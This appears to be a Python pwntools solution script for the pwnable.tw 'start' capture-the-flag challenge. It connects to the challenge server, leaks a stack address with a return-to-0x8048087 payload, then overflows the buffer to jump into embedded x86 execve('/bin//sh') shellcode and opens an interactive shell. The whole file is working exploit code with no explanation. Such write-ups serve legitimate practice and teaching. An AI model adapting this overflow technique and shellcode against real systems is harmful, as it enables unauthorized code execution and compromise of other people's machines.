#!/usr/bin/python

#start from pwnable.tw

from pwn import * 

server = remote("chall.pwnable.tw", 10000)
payload1='\x90'*20 + p32(0x8048087)
shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"

def leak_addr():
    recv = server.recvuntil(':')
    server.send(payload1)
    stack_addr = server.recv(4)
    print "stack address is " + hex(u32(stack_addr)) + "\n"
    return u32(stack_addr)

def exploit(stack_addr):
    payload2="\x90"*20 + p32(stack_addr + 20) + shellcode
    server.send(payload2)
    server.interactive()

def main():
    exploit(leak_addr())

if __name__=="__main__":
    main()
